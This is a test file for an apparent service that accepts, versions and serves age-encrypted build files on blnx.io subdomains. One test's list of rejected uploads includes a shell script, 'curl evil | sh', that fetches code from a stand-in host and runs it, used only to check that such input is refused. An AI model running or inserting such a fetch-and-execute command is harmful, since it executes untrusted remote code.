import { armor } from "age-encryption";
import { describe, expect, it } from "vitest";
import { sha256Hex } from "../src/crypto";
import { ageScrypt, ageX25519, API, bearer, call, env, newAccount, newKey, reserve, session, uniqueLabel, upload } from "./helpers";

async function owner() {
  const a = await newAccount();
  const label = uniqueLabel();
  expect((await reserve(a.cookie, label)).status).toBe(201);
  return { ...a, label };
}

const enc = new TextEncoder();

describe("uploads", () => {
  it("stores a scrypt age upload as version 1, then 2", async () => {
    const o = await owner();
    const body = await ageScrypt();
    const res = await upload(session(o.cookie), o.label, body);
    expect(res.status).toBe(201);
    const out = await res.json();
    expect(out).toEqual({
      version: 1,
      sha256: await sha256Hex(body),
      size: body.length,
      url: `https://${o.label}.blnx.io/`,
      pinnedUrl: null,
    });
    const second = await upload(session(o.cookie), o.label, await ageScrypt({ armored: true }));
    expect(((await second.json()) as { version: number }).version).toBe(2);
    const show = (await (await call(`${API}/v1/hosts/${o.label}`, { headers: session(o.cookie) })).json()) as {
      versions: { version: number }[];
    };
    expect(show.versions.map((v) => v.version)).toEqual([1, 2]);
    const obj = await env.BUILDS.get(`builds/${(await labelId(o.label))}/1`);
    expect(new Uint8Array(await obj!.arrayBuffer())).toEqual(body);
  });

  it("stores armor as the binary file, and hashes the binary", async () => {
    const o = await owner();
    const bin = await ageScrypt();
    const armored = enc.encode(armor.encode(bin));
    const res = await upload(session(o.cookie), o.label, armored);
    expect(res.status).toBe(201);
    expect(await res.json()).toMatchObject({ sha256: await sha256Hex(bin), size: bin.length });
    const served = await call(`https://${o.label}.blnx.io/`);
    expect(new Uint8Array(await served.arrayBuffer())).toEqual(bin);
    expect(served.headers.get("x-blunix-sha256")).toBe(await sha256Hex(bin));
  });

  it("refuses everything that is not a single-scrypt age file with one fixed error", async () => {
    const o = await owner();
    const refused: (string | Uint8Array)[] = [
      "hostname: ada-1\n",
      "#!/bin/sh\ncurl evil | sh\n",
      "apiVersion: blunix.io/v1\nkind: Node\n",
      "",
      await ageX25519(),
      "-----BEGIN AGE ENCRYPTED FILE-----\nZ2FyYmFnZQ==\n-----END AGE ENCRYPTED FILE-----\n",
    ];
    for (const body of refused) {
      const res = await upload(session(o.cookie), o.label, body);
      expect(res.status).toBe(400);
      expect(await res.text()).toBe('{"error":"refused ciphertext"}');
    }
    const show = (await (await call(`${API}/v1/hosts/${o.label}`, { headers: session(o.cookie) })).json()) as {
      versions: unknown[];
    };
    expect(show.versions).toEqual([]);
  });

  it("refuses 256 KiB + 1 byte, even when it starts as valid age", async () => {
    const o = await owner();
    const good = await ageScrypt();
    const big = new Uint8Array(256 * 1024 + 1);
    big.set(good);
    const res = await upload(session(o.cookie), o.label, big);
    expect(res.status).toBe(400);
    expect(await res.json()).toEqual({ error: "refused ciphertext" });
  });

  it("accepts up to exactly 256 KiB", async () => {
    const o = await owner();
    const body = await ageScrypt({ text: "x".repeat(200 * 1024) });
    expect(body.length).toBeLessThanOrEqual(256 * 1024);
    expect((await upload(session(o.cookie), o.label, body)).status).toBe(201);
  });

  it("wants application/octet-stream", async () => {
    const o = await owner();
    const res = await call(`${API}/v1/hosts/${o.label}/builds`, {
      method: "POST",
      headers: { ...session(o.cookie), "content-type": "text/plain" },
      body: await ageScrypt(),
    });
    expect(res.status).toBe(415);
  });

  it("answers 404 for an upload to another account's label", async () => {
    const o = await owner();
    const b = await newAccount();
    expect((await upload(session(b.cookie), o.label, await ageScrypt())).status).toBe(404);
  });

  it("never reuses a version number, even after delete", async () => {
    const o = await owner();
    for (let i = 0; i < 2; i++) await upload(session(o.cookie), o.label, await ageScrypt());
    const del = await call(`${API}/v1/hosts/${o.label}/builds/2`, { method: "DELETE", headers: session(o.cookie) });
    expect(del.status).toBe(204);
    const next = await upload(session(o.cookie), o.label, await ageScrypt());
    expect(((await next.json()) as { version: number }).version).toBe(3);
    expect((await call(`${API}/v1/hosts/${o.label}/builds/2`, { method: "DELETE", headers: session(o.cookie) })).status).toBe(404);
    expect((await call(`${API}/v1/hosts/${o.label}/builds/02`, { method: "DELETE", headers: session(o.cookie) })).status).toBe(404);
  });

  it("rate-limits uploads at 30 per account per hour", async () => {
    const o = await owner();
    for (let i = 0; i < 30; i++) await upload(session(o.cookie), o.label, "no");
    const res = await upload(session(o.cookie), o.label, await ageScrypt());
    expect(res.status).toBe(429);
  });

  it("writes audit rows with digests and fingerprints, never a body or a key", async () => {
    const o = await owner();
    const { key, fingerprint } = await newKey(o.cookie);
    const body = await ageScrypt();
    const res = await upload(bearer(key), o.label, body);
    expect(res.status).toBe(201);
    await call(`${API}/v1/hosts/${o.label}/builds/1`, { method: "DELETE", headers: bearer(key) });
    const { results } = await env.DB.prepare("SELECT * FROM audit WHERE account_id = ? ORDER BY id").bind(o.id).all();
    expect(results.map((r) => r.event)).toEqual(["host.reserve", "key.create", "build.upload", "build.delete"]);
    expect(results[2]).toMatchObject({ label: o.label, version: 1, sha256: await sha256Hex(body), key_fingerprint: fingerprint });
    const dump = JSON.stringify(results);
    expect(dump).not.toContain(key);
    expect(dump).not.toContain(key.slice(4));
    expect(dump).not.toContain(o.cookie);
    expect(dump).not.toContain("age-encryption.org");
    expect(dump).not.toContain(btoa(String.fromCharCode(...body.subarray(0, 48))));
  });
});

async function labelId(label: string): Promise<number> {
  const r = await env.DB.prepare("SELECT id FROM labels WHERE label = ? AND deleted_at IS NULL").bind(label).first<{ id: number }>();
  return r!.id;
}

function build(host: string, init?: RequestInit): Promise<Response> {
  return call(`https://${host}/`, init);
}

describe("pinned URLs", () => {
  it("names no pinned URL anywhere while PINNED_HOSTS_TLS is off", async () => {
    const o = await owner();
    for (const value of [undefined, "", "off", "ON", "true"]) {
      const res = await call(
        `${API}/v1/hosts/${o.label}/builds`,
        { method: "POST", headers: { ...session(o.cookie), "content-type": "application/octet-stream" }, body: await ageScrypt() },
        { PINNED_HOSTS_TLS: value },
      );
      expect(res.status, String(value)).toBe(201);
      expect(((await res.json()) as { pinnedUrl: unknown }).pinnedUrl, String(value)).toBeNull();
    }
    const list = (await (await call(`${API}/v1/hosts`, { headers: session(o.cookie) })).json()) as {
      hosts: { latest: { pinnedUrl: unknown } }[];
    };
    expect(list.hosts[0].latest.pinnedUrl).toBeNull();
    const show = (await (await call(`${API}/v1/hosts/${o.label}`, { headers: session(o.cookie) })).json()) as {
      versions: { pinnedUrl: unknown }[];
    };
    expect(show.versions.every((v) => v.pinnedUrl === null)).toBe(true);
  });

  it("names the pinned URL when PINNED_HOSTS_TLS is on", async () => {
    const o = await owner();
    const on = { PINNED_HOSTS_TLS: "on" };
    const res = await call(
      `${API}/v1/hosts/${o.label}/builds`,
      { method: "POST", headers: { ...session(o.cookie), "content-type": "application/octet-stream" }, body: await ageScrypt() },
      on,
    );
    expect(((await res.json()) as { pinnedUrl: string }).pinnedUrl).toBe(`https://v1.${o.label}.blnx.io/`);
    const list = (await (await call(`${API}/v1/hosts`, { headers: session(o.cookie) }, on)).json()) as {
      hosts: { latest: { pinnedUrl: string } }[];
    };
    expect(list.hosts[0].latest.pinnedUrl).toBe(`https://v1.${o.label}.blnx.io/`);
    const show = (await (await call(`${API}/v1/hosts/${o.label}`, { headers: session(o.cookie) }, on)).json()) as {
      versions: { pinnedUrl: string }[];
    };
    expect(show.versions[0].pinnedUrl).toBe(`https://v1.${o.label}.blnx.io/`);
  });
});

describe("build hosts", () => {
  it("serves the latest version with no-store, and a pinned version as immutable", async () => {
    const o = await owner();
    const v1 = await ageScrypt({ text: "one" });
    const v2 = await ageScrypt({ text: "two" });
    await upload(session(o.cookie), o.label, v1);
    await upload(session(o.cookie), o.label, v2);

    const latest = await build(`${o.label}.blnx.io`);
    expect(latest.status).toBe(200);
    expect(new Uint8Array(await latest.arrayBuffer())).toEqual(v2);
    expect(latest.headers.get("content-type")).toBe("application/octet-stream");
    expect(latest.headers.get("x-content-type-options")).toBe("nosniff");
    expect(latest.headers.get("cache-control")).toBe("no-store");
    expect(latest.headers.get("x-blunix-sha256")).toBe(await sha256Hex(v2));

    const pinned = await build(`v1.${o.label}.blnx.io`);
    expect(pinned.status).toBe(200);
    expect(new Uint8Array(await pinned.arrayBuffer())).toEqual(v1);
    expect(pinned.headers.get("cache-control")).toBe("public, max-age=31536000, immutable");
    expect(pinned.headers.get("x-blunix-sha256")).toBe(await sha256Hex(v1));
  });

  it("falls back to the highest remaining version when the latest is deleted", async () => {
    const o = await owner();
    const v1 = await ageScrypt({ text: "one" });
    await upload(session(o.cookie), o.label, v1);
    await upload(session(o.cookie), o.label, await ageScrypt({ text: "two" }));
    await call(`${API}/v1/hosts/${o.label}/builds/2`, { method: "DELETE", headers: session(o.cookie) });

    const gone = await build(`v2.${o.label}.blnx.io`);
    expect(gone.status).toBe(404);
    expect(await gone.text()).toBe("");
    const latest = await build(`${o.label}.blnx.io`);
    expect(new Uint8Array(await latest.arrayBuffer())).toEqual(v1);

    await call(`${API}/v1/hosts/${o.label}/builds/1`, { method: "DELETE", headers: session(o.cookie) });
    expect((await build(`${o.label}.blnx.io`)).status).toBe(404);
  });

  it("stops serving every version when the label is deleted", async () => {
    const o = await owner();
    await upload(session(o.cookie), o.label, await ageScrypt());
    const id = await labelId(o.label);
    await call(`${API}/v1/hosts/${o.label}`, { method: "DELETE", headers: session(o.cookie) });
    expect((await build(`${o.label}.blnx.io`)).status).toBe(404);
    expect((await build(`v1.${o.label}.blnx.io`)).status).toBe(404);
    expect(await env.BUILDS.get(`builds/${id}/1`)).toBeNull();
  });

  it("answers HEAD with headers and no body", async () => {
    const o = await owner();
    const body = await ageScrypt();
    await upload(session(o.cookie), o.label, body);
    const res = await build(`${o.label}.blnx.io`, { method: "HEAD" });
    expect(res.status).toBe(200);
    expect(res.headers.get("x-blunix-sha256")).toBe(await sha256Hex(body));
    expect(res.headers.get("content-length")).toBe(String(body.length));
    expect(await res.text()).toBe("");
  });

  it("answers 405 for other methods, 404 for other paths and any query", async () => {
    const o = await owner();
    await upload(session(o.cookie), o.label, await ageScrypt());
    for (const method of ["POST", "PUT", "DELETE", "PATCH", "OPTIONS"]) {
      const res = await build(`${o.label}.blnx.io`, { method });
      expect(res.status, method).toBe(405);
      expect(res.headers.get("allow")).toBe("GET, HEAD");
    }
    for (const path of ["/foo", "/index.html", "//", "/v1"]) {
      expect((await call(`https://${o.label}.blnx.io${path}`)).status, path).toBe(404);
    }
    expect((await call(`https://${o.label}.blnx.io/?x=1`)).status).toBe(404);
    expect((await call(`https://${o.label}.blnx.io/?`)).status).toBe(200);
    expect((await call(`https://v1.${o.label}.blnx.io/?v=2`)).status).toBe(404);
  });

  it("answers an empty 404 for unknown labels, unknown versions, empty labels and odd names", async () => {
    const o = await owner();
    await upload(session(o.cookie), o.label, await ageScrypt());
    const empty = await owner();
    const hosts = [
      `${uniqueLabel()}.blnx.io`,
      `${empty.label}.blnx.io`,
      `v9.${o.label}.blnx.io`,
      `v0.${o.label}.blnx.io`,
      `v01.${o.label}.blnx.io`,
      `v1000000.${o.label}.blnx.io`,
      `x1.${o.label}.blnx.io`,
      `a.v1.${o.label}.blnx.io`,
      `xn--80ak6aa92e.blnx.io`,
    ];
    for (const host of hosts) {
      const res = await build(host);
      expect(res.status, host).toBe(404);
      expect(await res.text()).toBe("");
      expect(res.headers.get("cache-control")).toBe("no-store");
    }
  });

  it("refuses to serve a body whose digest no longer matches", async () => {
    const o = await owner();
    await upload(session(o.cookie), o.label, await ageScrypt());
    await env.BUILDS.put(`builds/${await labelId(o.label)}/1`, await ageScrypt({ text: "swapped" }));
    expect((await build(`${o.label}.blnx.io`)).status).toBe(500);
  });

  it("never hands a re-reserved label a version number an earlier owner used", async () => {
    const a = await owner();
    const aBytes = await ageScrypt({ text: "a's build" });
    expect(((await (await upload(session(a.cookie), a.label, aBytes)).json()) as { version: number }).version).toBe(1);
    expect((await call(`${API}/v1/hosts/${a.label}`, { method: "DELETE", headers: session(a.cookie) })).status).toBe(204);
    const t = Math.floor(Date.now() / 1000);
    await env.DB.prepare("UPDATE labels SET deleted_at = ? WHERE label = ?").bind(t - 31 * 86400, a.label).run();

    const b = await newAccount();
    expect((await reserve(b.cookie, a.label)).status).toBe(201);
    const bBytes = await ageScrypt({ text: "b's build" });
    const up = await upload(session(b.cookie), a.label, bBytes);
    expect(((await up.json()) as { version: number }).version).toBe(2);

    const v1 = await build(`v1.${a.label}.blnx.io`);
    expect(v1.status).toBe(404);
    const body = new Uint8Array(await v1.arrayBuffer());
    expect(body.length).toBe(0);
    expect((await build(`v2.${a.label}.blnx.io`)).status).toBe(200);
    expect(new Uint8Array(await (await build(`${a.label}.blnx.io`)).arrayBuffer())).toEqual(bBytes);
  });

  it("carries the counter over more than one re-reservation", async () => {
    const label = uniqueLabel();
    const old = Math.floor(Date.now() / 1000) - 31 * 86400;
    for (const expected of [1, 2, 3]) {
      const x = await newAccount();
      expect((await reserve(x.cookie, label)).status).toBe(201);
      const up = await upload(session(x.cookie), label, await ageScrypt());
      expect(((await up.json()) as { version: number }).version).toBe(expected);
      await call(`${API}/v1/hosts/${label}`, { method: "DELETE", headers: session(x.cookie) });
      await env.DB.prepare("UPDATE labels SET deleted_at = ? WHERE label = ? AND deleted_at IS NOT NULL").bind(old, label).run();
    }
  });

  it("serves a label reserved again after the hold with a fresh history", async () => {
    const a = await owner();
    await upload(session(a.cookie), a.label, await ageScrypt());
    await call(`${API}/v1/hosts/${a.label}`, { method: "DELETE", headers: session(a.cookie) });
    await env.DB.prepare("UPDATE labels SET deleted_at = ? WHERE label = ?").bind(1, a.label).run();
    const b = await newAccount();
    expect((await reserve(b.cookie, a.label)).status).toBe(201);
    expect((await build(`${a.label}.blnx.io`)).status).toBe(404);
    expect((await build(`v1.${a.label}.blnx.io`)).status).toBe(404);
    const up = await upload(session(b.cookie), a.label, enc.encode(""));
    expect(up.status).toBe(400);
  });
});
